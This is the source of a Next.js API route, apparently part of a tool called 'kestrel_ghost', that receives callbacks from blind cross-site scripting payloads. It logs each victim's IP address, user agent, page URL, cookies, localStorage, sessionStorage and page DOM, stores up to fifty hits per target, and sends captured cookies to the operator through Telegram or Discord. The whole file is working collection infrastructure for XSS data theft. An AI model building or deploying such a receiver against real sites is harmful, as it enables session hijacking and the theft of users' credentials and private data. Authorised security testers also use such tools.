import { kv } from '@vercel/kv';
import { NextResponse } from 'next/server';

// Initialize global in-memory store for local development if Vercel KV is not connected
if (!global._webhooksStore) {
  global._webhooksStore = {
    requests: {},
    configs: {},
    counts: {},
    xss: {} // New XSS storage node
  };
} else if (!global._webhooksStore.xss) {
  global._webhooksStore.xss = {};
}

function generateXssId() {
  if (typeof crypto !== 'undefined' && crypto.randomUUID) {
    return crypto.randomUUID();
  }
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

async function sendNotification(config, title, fields) {
  if (!config) return;
  
  // Format dynamic markdown for Telegram
  let telegramMessage = `🛰 *[kestrel_ghost]* 🛰\n🔥 *${title}* 🔥\n\n`;
  for (const [key, val] of Object.entries(fields)) {
    telegramMessage += `• *${key}*: \`${String(val).replace(/[_*`\[\]]/g, '\\$&')}\`\n`;
  }
  
  // Send Telegram
  if (config.telegramEnabled && config.telegramToken && config.telegramChatId) {
    try {
      const url = `https://api.telegram.org/bot${config.telegramToken}/sendMessage`;
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: config.telegramChatId,
          text: telegramMessage,
          parse_mode: 'Markdown'
        })
      });
    } catch (err) {
      console.error('Telegram Notification failed:', err);
    }
  }
  
  // Send Discord Webhook
  if (config.discordEnabled && config.discordWebhook) {
    try {
      const embeds = [{
        title: `🛰 kestrel_ghost: ${title}`,
        color: 0x7c4dff, // violet for XSS
        fields: Object.entries(fields).map(([key, val]) => ({
          name: key,
          value: String(val).substring(0, 1023) || 'None',
          inline: false
        })),
        timestamp: new Date().toISOString()
      }];
      await fetch(config.discordWebhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds })
      });
    } catch (err) {
      console.error('Discord Notification failed:', err);
    }
  }
}

export async function POST(request) {
  const { searchParams } = new URL(request.url);
  const id = searchParams.get('id');

  if (!id) {
    return NextResponse.json({ success: false, error: 'Missing target ID parameter' }, { status: 400 });
  }

  try {
    // 1. Get client IP
    let ip = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || '127.0.0.1';
    if (ip.includes(',')) {
      ip = ip.split(',')[0].trim();
    }

    // 2. Parse Incoming JSON payload
    let payload = {};
    try {
      payload = await request.json();
    } catch (e) {
      // In case sendBeacon sends plain text
      try {
        const text = await request.text();
        payload = JSON.parse(text);
      } catch (err) {
        return NextResponse.json({ success: false, error: 'Malformed JSON payload' }, { status: 400 });
      }
    }

    // 3. Construct XSS log entry
    const xssLog = {
      triggerId: generateXssId(),
      timestamp: new Date().toISOString(),
      ip,
      userAgent: request.headers.get('user-agent') || 'Unknown',
      uri: payload.uri || 'Unknown Location',
      referrer: payload.ref || 'None',
      cookies: payload.cookies || 'None (or HTTP-Only)',
      localStorage: payload.local || '{}',
      sessionStorage: payload.session || '{}',
      dom: payload.dom || '[No DOM Captured]',
    };

    // 4. Save to Redis or In-Memory
    const isKvConnected = !!process.env.KV_URL;
    
    if (isKvConnected) {
      const xssKey = `xss:${id}:triggers`;
      await kv.lpush(xssKey, JSON.stringify(xssLog));
      await kv.ltrim(xssKey, 0, 49); // Keep latest 50 XSS hits
    } else {
      // In-Memory Fallback
      const store = global._webhooksStore;
      if (!store.xss) store.xss = {};
      if (!store.xss[id]) store.xss[id] = [];
      
      store.xss[id].unshift(xssLog);
      store.xss[id] = store.xss[id].slice(0, 50); // Keep last 50
    }

    // 5. Send alerts if configured
    let savedConfig = null;
    if (isKvConnected) {
      savedConfig = await kv.get(`webhook:${id}:config`);
    } else {
      savedConfig = global._webhooksStore.configs[id] || null;
    }

    if (savedConfig) {
      try {
        const config = typeof savedConfig === 'string' ? JSON.parse(savedConfig) : savedConfig;
        if (config && (config.telegramEnabled || config.discordEnabled)) {
          const xssFields = {
            'Payload Type': 'BLIND XSS TRIGGERED ☣️',
            'Trigger Source URL': xssLog.uri,
            'Victim IP Address': xssLog.ip,
            'User-Agent String': xssLog.userAgent,
            'Captured Cookies': xssLog.cookies ? xssLog.cookies.substring(0, 400) : 'None'
          };
          sendNotification(config, 'Blind XSS Payload Triggered!', xssFields).catch(console.error);
        }
      } catch (err) {
        console.error('XSS Notify processing error:', err);
      }
    }

    return new NextResponse(JSON.stringify({ success: true, message: 'XSS Callback captured' }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });

  } catch (error) {
    console.error('XSS callback ingestion error:', error);
    return NextResponse.json({ success: false, error: 'Internal receiver error' }, { status: 500 });
  }
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}
